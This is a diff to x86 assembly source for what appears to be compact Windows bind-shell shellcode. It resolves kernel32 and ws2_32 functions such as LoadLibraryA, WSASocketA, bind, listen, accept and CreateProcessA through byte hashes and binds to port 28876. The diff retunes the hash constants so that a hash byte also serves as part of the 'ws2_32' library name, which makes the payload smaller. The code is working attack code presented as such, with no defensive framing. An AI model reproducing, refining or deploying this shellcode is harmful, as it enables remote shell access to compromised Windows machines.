@@ -29,15 +29,18 @@ port equ 28876                          ; The port number to bind to.
 AF_INET                                 equ 2
 
 ; These hashes are calculated with a separate tool.
-hash_kernel32_CreateProcessA            equ 0x81
-hash_kernel32_LoadLibraryA              equ 0x59
-hash_ws2_32_WSAStartup                  equ 0xD3
-hash_ws2_32_WSASocket                   equ 0x62
-hash_ws2_32_bind                        equ 0x30
-hash_ws2_32_listen                      equ 0x20
-hash_ws2_32_accept                      equ 0x41
+hash_xor_value                          equ 0x71
+hash_start_value                        equ 0x36
+hash_kernel32_CreateProcessA            equ 0xB7
+hash_kernel32_LoadLibraryA              equ 0x8F
+hash_ws2_32_WSAStartup                  equ 0x09
+hash_ws2_32_WSASocketA                  equ 0x98
+hash_ws2_32_bind                        equ 0x66
+hash_ws2_32_listen                      equ 0x56
+hash_ws2_32_accept                      equ 0x77
 sizeof_proc_address_table               equ 7 * 4
 offset_WSAStartup_in_hash_table         equ 2
+offset_accept_in_hash_table             equ 6
 
 %define B2W(b1,b2)                      (((b2) << 8) + (b1))
 %define W2DW(w1,w2)                     (((w2) << 16) + (w1))
@@ -57,11 +60,14 @@ next_module:
     JNE     next_module                 ; No: try next module.
 
 ; Create hash table and "ws2_32" (for LoadLibraryA) on the stack:
-    PUSH    BYTE '2'                    ; Stack = "2"
-    PUSH    B2DW('s', '2', '_', '3')    ; Stack = "s2_32"
-    PUSH    B2DW(hash_ws2_32_bind, hash_ws2_32_listen, hash_ws2_32_accept, 'w') ; hash, hash, "ws2_32"
-end_of_hash_table_marker                equ 'w'
-    PUSH    B2DW(hash_kernel32_CreateProcessA, hash_kernel32_LoadLibraryA, hash_ws2_32_WSAStartup, hash_ws2_32_WSASocket)
+    PUSH    ECX                         ; Stack = 00 00 00 00
+    PUSH    B2DW('2', '_', '3', '2')    ; Stack = "s2_32"
+%if (hash_ws2_32_accept != 'w')
+  %error The hash for ws2_32.accept is not a 'w'
+%endif
+    PUSH    B2DW(hash_ws2_32_bind, hash_ws2_32_listen, hash_ws2_32_accept, 's') ; hash, hash, "ws2_32"
+end_of_hash_table_marker                equ 's'
+    PUSH    B2DW(hash_kernel32_CreateProcessA, hash_kernel32_LoadLibraryA, hash_ws2_32_WSAStartup, hash_ws2_32_WSASocketA)
 sizeof_hash_table                       equ 7
     MOV     ESI, ESP                    ; ESI -> Hash table
 ; Reserve space for WSADATA
@@ -108,13 +114,13 @@ next_function_loop:
     INC     EDX                         ; Increment function number
     MOV     ESI, [ECX + EDX * 4]        ; ESI = offset(function name)
     ADD     ESI, EBP                    ; ESI = &(function name)
-    XOR     EAX, EAX                    ; EAX = 0
+    MOV     AH, hash_start_value        ; Initialize the hash
 hash_loop:
 ; Hash the function name:
     LODSB                               ; Load a character of the function name
-    XOR     AL, 0x71                    ; Calculate a hash
+    XOR     AL, hash_xor_value          ; Calculate a hash
     SUB     AH, AL                      ;
-    CMP     AL, 0x71                    ; Is this the terminating 0 byte?
+    CMP     AL, hash_xor_value          ; Is this the terminating 0 byte?
     JNE     hash_loop                   ; No: continue hashing
     CMP     AH, [EDI]                   ; Yes: Does the hash match ?
 ; Check if the hash matches and loop if not:
@@ -133,7 +139,7 @@ hash_loop:
 ; When needed, call LoadLibraryA to start looking for ws2_32.dll functions:
     CMP     BYTE [ESI], hash_ws2_32_WSAStartup ; We just found LoadLibraryA
     JNE     skip_load_library           ;
-    LEA     EBX, [ESI - offset_WSAStartup_in_hash_table + sizeof_hash_table]
+    LEA     EBX, [ESI - offset_WSAStartup_in_hash_table + offset_accept_in_hash_table]
     PUSH    EBX                         ; __in LPCTSTR lpFileName = &("ws2_32")
     CALL    EAX                         ; LoadLibraryA(&"ws2_32") 
     PUSH    EDI                         ; Save proc address table[WSAStartup]
